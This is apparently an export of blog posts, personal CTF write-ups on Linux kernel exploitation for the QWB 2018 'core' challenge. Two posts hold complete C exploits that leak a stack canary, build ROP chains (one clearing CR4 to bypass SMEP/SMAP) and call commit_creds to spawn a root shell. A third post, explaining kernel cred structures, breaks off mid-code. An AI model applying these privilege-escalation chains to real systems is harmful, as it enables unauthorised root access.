class="line">root@Ubuntu22:/home/grxer# docker-compose --version</span><br><span class="line">Docker Compose version v2.20.3x</span><br></pre></td></tr></table></figure><p><a href="https://yeasy.gitbook.io/docker_practice/compose/commands"></a></p><p><a href="https://yeasy.gitbook.io/docker_practice/compose/compose_file">docker-compose.yml</a></p><h2 id=""><a href="#" class="headerlink" title=""></a></h2><p> <a href="https://yeasy.gitbook.io/docker_practice">https://yeasy.gitbook.io/docker_practice</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Kernel Bypass smep smap</title>
      <link href="/2023/08/16/kernel-bypass-smep/"/>
      <url>/2023/08/16/kernel-bypass-smep/</url>
      
        <content type="html"><![CDATA[<p>k</p><p><img src="/2023/08/16/kernel-bypass-smep/image-20230816220503539.png" alt="image-20230816220503539"></p><p>cr4 20210x6f0,cr4mov</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov cr4,0x6f0</span><br></pre></td></tr></table></figure><p>vmlinuxcr4gadget</p><h2 id="-2018-core"><a href="#-2018-core" class="headerlink" title=" 2018 - core"></a> 2018 - core</h2><p>sempsmap</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">qemu-system-x86_64 \</span><br><span class="line">    -m 512M \</span><br><span class="line">    -kernel ./bzImage \</span><br><span class="line">    -initrd ./core.cpio \</span><br><span class="line">    -append &quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet kaslr&quot; \</span><br><span class="line">     -cpu qemu64-v1,+smep,+smap \</span><br><span class="line">    -s \</span><br><span class="line">    -netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \</span><br><span class="line">    -nographic</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">/ $ grep smep /proc/cpuinfo</span><br><span class="line">flags           : fpu de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov patp</span><br><span class="line">/ $ grep smap /proc/cpuinfo</span><br><span class="line">flags           : fpu de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov patp</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stddef.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="comment">/*&gt;&gt;&gt; from pwn import *</span></span><br><span class="line"><span class="comment">&gt;&gt;&gt; vmlinux = ELF(&quot;./vmlinux&quot;)</span></span><br><span class="line"><span class="comment">[*] &#x27;/home/grxer/kernel-env/QWB2018-core/give_to_player/vmlinux&#x27;</span></span><br><span class="line"><span class="comment">    Arch:     amd64-64-little</span></span><br><span class="line"><span class="comment">    Version:  4.15.8</span></span><br><span class="line"><span class="comment">    RELRO:    No RELRO</span></span><br><span class="line"><span class="comment">    Stack:    Canary found</span></span><br><span class="line"><span class="comment">    NX:       NX disabled</span></span><br><span class="line"><span class="comment">    PIE:      No PIE (0xffffffff81000000)</span></span><br><span class="line"><span class="comment">    RWX:      Has RWX segments</span></span><br><span class="line"><span class="comment">&gt;&gt;&gt; hex(vmlinux.sym[&#x27;init_cred&#x27;])</span></span><br><span class="line"><span class="comment">&#x27;0xFFFFFFFF8223D1A0&#x27;*/</span></span><br><span class="line"><span class="type">size_t</span> init_cred = <span class="number">0</span>;</span><br><span class="line"><span class="type">size_t</span> commit_creds = <span class="number">0</span>, prepare_kernel_cred = <span class="number">0</span>;</span><br><span class="line"><span class="type">size_t</span> vmlinux_base = <span class="number">0</span>, bias;</span><br><span class="line"><span class="type">size_t</span> raw_base = <span class="number">0xffffffff81000000</span>;</span><br><span class="line"><span class="type">size_t</span> <span class="title function_">find_symbols</span><span class="params">()</span> &#123;</span><br><span class="line">  FILE *kallsyms_fd = fopen(<span class="string">&quot;/tmp/kallsyms&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (kallsyms_fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*]open kallsyms error!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">0x30</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">  <span class="keyword">while</span> (fgets(buf, <span class="number">0x30</span>, kallsyms_fd)) &#123;</span><br><span class="line">    <span class="keyword">if</span> (commit_creds &amp; prepare_kernel_cred)</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strstr</span>(buf, <span class="string">&quot;commit_creds&quot;</span>) &amp;&amp; !commit_creds) &#123;</span><br><span class="line">      <span class="comment">/* puts(buf); */</span></span><br><span class="line">      <span class="type">char</span> hex[<span class="number">20</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">      <span class="built_in">strncpy</span>(hex, buf, <span class="number">16</span>);</span><br><span class="line">      <span class="comment">/* printf(&quot;hex: %s\n&quot;, hex); */</span></span><br><span class="line">      <span class="built_in">sscanf</span>(hex, <span class="string">&quot;%zx&quot;</span>, &amp;commit_creds);</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;commit_creds addr: %p\n&quot;</span>, commit_creds);</span><br><span class="line">      vmlinux_base = commit_creds - <span class="number">0x9c8e0</span>;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;vmlinux_base addr: %p\n&quot;</span>, vmlinux_base);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strstr</span>(buf, <span class="string">&quot;prepare_kernel_cred&quot;</span>) &amp;&amp; !prepare_kernel_cred) &#123;</span><br><span class="line">      <span class="type">char</span> hex[<span class="number">20</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">      <span class="built_in">strncpy</span>(hex, buf, <span class="number">16</span>);</span><br><span class="line">      <span class="built_in">sscanf</span>(hex, <span class="string">&quot;%zx&quot;</span>, &amp;prepare_kernel_cred);</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;prepare_kernel_cred addr: %p\n&quot;</span>, prepare_kernel_cred);</span><br><span class="line">      assert(vmlinux_base == (prepare_kernel_cred - <span class="number">0x9cce0</span>));</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  bias = vmlinux_base - raw_base;</span><br><span class="line">  <span class="keyword">if</span> (!(prepare_kernel_cred &amp; commit_creds)) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*]Error!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">spawn_shell</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (!getuid()) &#123;</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*]spawn shell error!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">size_t</span> user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"><span class="type">void</span> <span class="title function_">save_status</span><span class="params">()</span> &#123;</span><br><span class="line">  __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">          <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">          <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">          <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">          <span class="string">&quot;pop user_rflags;&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;[*]status has been saved.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">getRootPrivilige</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">void</span> * (*prepare_kernel_cred_ptr)(<span class="type">void</span> *) = prepare_kernel_cred;</span><br><span class="line">    <span class="type">int</span> (*commit_creds_ptr)(<span class="type">void</span> *) = commit_creds;</span><br><span class="line">    (*commit_creds_ptr)((*prepare_kernel_cred_ptr)(<span class="literal">NULL</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="type">int</span> fd = open(<span class="string">&quot;/proc/core&quot;</span>, <span class="number">2</span>);</span><br><span class="line">  <span class="keyword">if</span> (fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*]open /proc/core error!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  find_symbols();</span><br><span class="line">  init_cred = <span class="number">0xFFFFFFFF8223D1A0</span> + bias;</span><br><span class="line">  ioctl(fd, <span class="number">0x6677889C</span>, <span class="number">0x40</span>);</span><br><span class="line">  <span class="type">size_t</span> canary[<span class="number">0x40</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">  ioctl(fd, <span class="number">0x6677889B</span>, canary);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[+]canary: %p\n&quot;</span>, canary[<span class="number">0</span>]);</span><br><span class="line">  <span class="type">size_t</span> rop[<span class="number">0x1000</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">  <span class="type">int</span> i;</span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">    rop[i] = canary[<span class="number">0</span>];</span><br><span class="line">  &#125;</span><br><span class="line">  save_status();</span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">    0xffffffff81000b2f: pop rdi; ret;</span></span><br><span class="line"><span class="comment">    0xffffffff81075014: mov cr4, rdi; push rdx; popfq; ret;</span></span><br><span class="line"><span class="comment">    0xffffffff81a012da: swapgs; popfq; ret;</span></span><br><span class="line"><span class="comment">    0xffffffff81050ac2: iretq; ret;</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line">  rop[i++] = <span class="number">0xffffffff81000b2f</span> + bias;<span class="comment">//pop rdi; ret;</span></span><br><span class="line">  rop[i++] = <span class="number">0x6f0</span>;</span><br><span class="line">  rop[i++] = <span class="number">0xffffffff81075014</span> + bias;<span class="comment">//mov cr4, rdi; push rdx; popfq; ret;</span></span><br><span class="line">  rop[i++] = (<span class="type">size_t</span>)getRootPrivilige;</span><br><span class="line">  rop[i++] = <span class="number">0xffffffff81a012da</span> + bias; <span class="comment">// swapgs; popfq; ret;</span></span><br><span class="line">  rop[i++] = <span class="number">0</span>;</span><br><span class="line">  rop[i++] = <span class="number">0xffffffff81050ac2</span> + bias; <span class="comment">// iretq; ret;</span></span><br><span class="line">  rop[i++] = (<span class="type">size_t</span>)spawn_shell;       <span class="comment">// rip</span></span><br><span class="line">  rop[i++] = user_cs;</span><br><span class="line">  rop[i++] = user_rflags;</span><br><span class="line">  rop[i++] = user_sp;</span><br><span class="line">  rop[i++] = user_ss;</span><br><span class="line">  write(fd, rop, <span class="number">0x800</span>);</span><br><span class="line">  ioctl(fd, <span class="number">0x6677889A</span>, <span class="number">0xffffffffffff0000</span> | (<span class="number">0x100</span>));</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2023/08/16/kernel-bypass-smep/image-20230816215642698.png" alt="image-20230816215642698"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Kernel Ret2usr</title>
      <link href="/2023/08/16/kernel-ret2usr/"/>
      <url>/2023/08/16/kernel-ret2usr/</url>
      
        <content type="html"><![CDATA[<p> <strong>SMAP&#x2F;SMEP</strong>cr42021ret2usr&#x2F;</p><p>KPTI ret2usr</p><h2 id="2018--core"><a href="#2018--core" class="headerlink" title="2018  - core"></a>2018  - core</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stddef.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="comment">/*&gt;&gt;&gt; from pwn import *</span></span><br><span class="line"><span class="comment">&gt;&gt;&gt; vmlinux = ELF(&quot;./vmlinux&quot;)</span></span><br><span class="line"><span class="comment">[*] &#x27;/home/grxer/kernel-env/QWB2018-core/give_to_player/vmlinux&#x27;</span></span><br><span class="line"><span class="comment">    Arch:     amd64-64-little</span></span><br><span class="line"><span class="comment">    Version:  4.15.8</span></span><br><span class="line"><span class="comment">    RELRO:    No RELRO</span></span><br><span class="line"><span class="comment">    Stack:    Canary found</span></span><br><span class="line"><span class="comment">    NX:       NX disabled</span></span><br><span class="line"><span class="comment">    PIE:      No PIE (0xffffffff81000000)</span></span><br><span class="line"><span class="comment">    RWX:      Has RWX segments</span></span><br><span class="line"><span class="comment">&gt;&gt;&gt; hex(vmlinux.sym[&#x27;init_cred&#x27;])</span></span><br><span class="line"><span class="comment">&#x27;0xFFFFFFFF8223D1A0&#x27;*/</span></span><br><span class="line"><span class="type">size_t</span> init_cred = <span class="number">0</span>;</span><br><span class="line"><span class="type">size_t</span> commit_creds = <span class="number">0</span>, prepare_kernel_cred = <span class="number">0</span>;</span><br><span class="line"><span class="type">size_t</span> vmlinux_base = <span class="number">0</span>, bias;</span><br><span class="line"><span class="type">size_t</span> raw_base = <span class="number">0xffffffff81000000</span>;</span><br><span class="line"><span class="type">size_t</span> <span class="title function_">find_symbols</span><span class="params">()</span> &#123;</span><br><span class="line">  FILE *kallsyms_fd = fopen(<span class="string">&quot;/tmp/kallsyms&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (kallsyms_fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*]open kallsyms error!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">0x30</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">  <span class="keyword">while</span> (fgets(buf, <span class="number">0x30</span>, kallsyms_fd)) &#123;</span><br><span class="line">    <span class="keyword">if</span> (commit_creds &amp; prepare_kernel_cred)</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strstr</span>(buf, <span class="string">&quot;commit_creds&quot;</span>) &amp;&amp; !commit_creds) &#123;</span><br><span class="line">      <span class="comment">/* puts(buf); */</span></span><br><span class="line">      <span class="type">char</span> hex[<span class="number">20</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">      <span class="built_in">strncpy</span>(hex, buf, <span class="number">16</span>);</span><br><span class="line">      <span class="comment">/* printf(&quot;hex: %s\n&quot;, hex); */</span></span><br><span class="line">      <span class="built_in">sscanf</span>(hex, <span class="string">&quot;%zx&quot;</span>, &amp;commit_creds);</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;commit_creds addr: %p\n&quot;</span>, commit_creds);</span><br><span class="line">      vmlinux_base = commit_creds - <span class="number">0x9c8e0</span>;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;vmlinux_base addr: %p\n&quot;</span>, vmlinux_base);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strstr</span>(buf, <span class="string">&quot;prepare_kernel_cred&quot;</span>) &amp;&amp; !prepare_kernel_cred) &#123;</span><br><span class="line">      <span class="type">char</span> hex[<span class="number">20</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">      <span class="built_in">strncpy</span>(hex, buf, <span class="number">16</span>);</span><br><span class="line">      <span class="built_in">sscanf</span>(hex, <span class="string">&quot;%zx&quot;</span>, &amp;prepare_kernel_cred);</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;prepare_kernel_cred addr: %p\n&quot;</span>, prepare_kernel_cred);</span><br><span class="line">      assert(vmlinux_base == (prepare_kernel_cred - <span class="number">0x9cce0</span>));</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  bias = vmlinux_base - raw_base;</span><br><span class="line">  <span class="keyword">if</span> (!(prepare_kernel_cred &amp; commit_creds)) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*]Error!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">spawn_shell</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (!getuid()) &#123;</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*]spawn shell error!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">size_t</span> user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"><span class="type">void</span> <span class="title function_">save_status</span><span class="params">()</span> &#123;</span><br><span class="line">  __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">          <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">          <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">          <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">          <span class="string">&quot;pop user_rflags;&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;[*]status has been saved.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">getRootPrivilige</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">void</span> * (*prepare_kernel_cred_ptr)(<span class="type">void</span> *) = prepare_kernel_cred;</span><br><span class="line">    <span class="type">int</span> (*commit_creds_ptr)(<span class="type">void</span> *) = commit_creds;</span><br><span class="line">    (*commit_creds_ptr)((*prepare_kernel_cred_ptr)(<span class="literal">NULL</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="type">int</span> fd = open(<span class="string">&quot;/proc/core&quot;</span>, <span class="number">2</span>);</span><br><span class="line">  <span class="keyword">if</span> (fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*]open /proc/core error!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  find_symbols();</span><br><span class="line">  init_cred = <span class="number">0xFFFFFFFF8223D1A0</span> +bias;</span><br><span class="line">  ioctl(fd, <span class="number">0x6677889C</span>, <span class="number">0x40</span>);</span><br><span class="line">  <span class="type">size_t</span> canary[<span class="number">0x40</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">  ioctl(fd, <span class="number">0x6677889B</span>, canary);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[+]canary: %p\n&quot;</span>, canary[<span class="number">0</span>]);</span><br><span class="line">  <span class="type">size_t</span> rop[<span class="number">0x1000</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">  <span class="type">int</span> i;</span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">    rop[i] = canary[<span class="number">0</span>];</span><br><span class="line">  &#125;</span><br><span class="line">  save_status();</span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">    0xffffffff81000b2f: pop rdi; ret;</span></span><br><span class="line"><span class="comment">    0xffffffff81a012da: swapgs; popfq; ret;</span></span><br><span class="line"><span class="comment">    0xffffffff81050ac2: iretq; ret;</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line">  rop[i++] = (<span class="type">size_t</span>)getRootPrivilige;</span><br><span class="line">  rop[i++] = <span class="number">0xffffffff81a012da</span> + bias; <span class="comment">// swapgs; popfq; ret;</span></span><br><span class="line">  rop[i++] = <span class="number">0</span>;</span><br><span class="line">  rop[i++] = <span class="number">0xffffffff81050ac2</span>+bias;  <span class="comment">// iretq; ret;</span></span><br><span class="line">  rop[i++] = (<span class="type">size_t</span>)spawn_shell; <span class="comment">// rip</span></span><br><span class="line">  rop[i++] = user_cs;</span><br><span class="line">  rop[i++] = user_rflags;</span><br><span class="line">  rop[i++] = user_sp;</span><br><span class="line">  rop[i++] = user_ss;</span><br><span class="line">  write(fd, rop, <span class="number">0x800</span>);</span><br><span class="line">  ioctl(fd, <span class="number">0x6677889A</span>, <span class="number">0xffffffffffff0000</span> | (<span class="number">0x100</span>));</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2023/08/16/kernel-ret2usr/image-20230816203017727.png" alt="image-20230816203017727"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Kernel Rop</title>
      <link href="/2023/08/14/kernel-rop/"/>
      <url>/2023/08/14/kernel-rop/</url>
      
        <content type="html"><![CDATA[<h2 id="process-descriptor"><a href="#process-descriptor" class="headerlink" title="process descriptor"></a>process descriptor</h2><p> <code>task_struct</code> ,<a href="https://elixir.bootlin.com/linux/v5.5-rc2/source/include/linux/sched.h#L629">include&#x2F;linux&#x2F;sched.h</a></p><p>task_struct</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Process credentials: */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Tracer&#x27;s credentials at attach: */</span></span><br><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> __<span class="title">rcu</span>        *<span class="title">ptracer_cred</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Objective and real subjective task credentials (COW): */</span></span><br><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> __<span class="title">rcu</span>        *<span class="title">real_cred</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Effective (overridable) subjective task credentials (COW): */</span></span><br><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> __<span class="title">rcu</span>        *<span class="title">cred</span>;</span></span><br></pre></td></tr></table></figure><p><strong>Process credentials</strong>  kernel  kernel  <code>cred</code>  cred</p><ul><li><strong>ptracer_cred</strong><code>ptrace</code>credgdb</li><li><strong>real_cred</strong><strong></strong><strong>objective cred</strong></li><li><strong>cred</strong><strong></strong><strong>subjective cred</strong>credkernel</li></ul><p>cred<a href="https://elixir.bootlin.com/linux/v5.5-rc2/source/include/linux/cred.h#L111">include&#x2F;linux&#x2F;cred.h</a></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * The security context of a task</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * The parts of the context break down into two categories:</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *  (1) The objective context of a task.  These parts are used when some other</span></span><br><span class="line"><span class="comment"> *    task is attempting to affect this one.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *  (2) The subjective context.  These details are used when the task is acting</span></span><br><span class="line"><span class="comment"> *    upon another object, be that a file, a task, a key or whatever.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Note that some members of this structure belong to both categories - the</span></span><br><span class="line"><span class="comment"> * LSM security pointer for instance.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * A task has two security pointers.  task-&gt;real_cred points to the objective</span></span><br><span class="line"><span class="comment"> * context that defines that task&#x27;s actual details.  The objective part of this</span></span><br><span class="line"><span class="comment"> * context is used whenever that task is acted upon.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * task-&gt;cred points to the subjective context that defines the details of how</span></span><br><span class="line"><span class="comment"> * that task is going to act upon another object.  This may be overridden</span></span><br><span class="line"><span class="comment"> * temporarily to point to another security context, but normally points to the</span></span><br><span class="line"><span class="comment"> * same context as task-&gt;real_cred.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cred</span> &#123;</span></span><br><span class="line">    <span class="type">atomic_t</span>    usage; </span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_DEBUG_CREDENTIALS</span></span><br><span class="line">    <span class="type">atomic_t</span>    subscribers;    <span class="comment">/* number of processes subscribed */</span></span><br><span class="line">    <span class="type">void</span>        *put_addr;</span><br><span class="line">    <span class="type">unsigned</span>    magic;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CRED_MAGIC  0x43736564</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CRED_MAGIC_DEAD 0x44656144</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="type">kuid_t</span>      uid;        <span class="comment">/* real UID of the task */</span> </span><br><span class="line">    <span class="type">kgid_t</span>      gid;        <span class="comment">/* real GID of the task */</span> real group ID</span><br><span class="line">    <span class="type">kuid_t</span>      suid;       <span class="comment">/* saved UID of the task */</span> saved user ID</span><br><span class="line">    <span class="type">kgid_t</span>      sgid;       <span class="comment">/* saved GID of the task */</span> saved group ID</span><br><span class="line">    <span class="type">kuid_t</span>      euid;       <span class="comment">/* effective UID of the task */</span> effective user ID</span><br><span class="line">    <span class="type">kgid_t</span>      egid;       <span class="comment">/* effective GID of the task */</span> effective group ID</span><br><span class="line">    <span class="type">kuid_t</span>      fsuid;      <span class="comment">/* UID for VFS ops */</span> VFSfilesystem user ID</span><br><span class="line">    <span class="type">kgid_t</span>      fsgid;      <span class="comment">/* GID for VFS ops */</span> VFSfilesystem group ID</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>uid&gt;fsgid  0root</p><p>rop<code>commit_creds(prepare_kernel_cred(NULL))</code>root</p><p> <strong>6.2</strong> <code>prepare_kernel_cred(NULL)</code> <strong> init_cred NULL</strong><code>commit_creds(&amp;init_cred)</code></p><blockquote><p><code>init_cred</code><code>init</code>  <code>cred</code> root ,,x <code>init_cred</code> </p></blockquote><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span> cred* <span class="title function_">prepare_kernel_cred</span><span class="params">(<span class="keyword">struct</span> task_struct* daemon)</span></span><br><span class="line">daemoncredcred</span><br><span class="line"><span class="type">int</span> <span class="title function_">commit_creds</span><span class="params">(<span class="keyword">struct</span> cred *new)</span></span><br><span class="line">cred</span><br></pre></td></tr></table></figure><h2 id="ROP"><a href="#ROP" class="headerlink" title="ROP"></a>ROP</h2><p>ropshellroot</p><p><img src="/2023/08/14/kernel-rop/image-20230816162903167.png" alt="image-20230816162903167"></p><p></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//-masm=intel</span></span><br><span class="line"><span class="type">size_t</span> user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"><span class="type">void</span> <span class="title function_">saveStatus</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    __asm__(<span 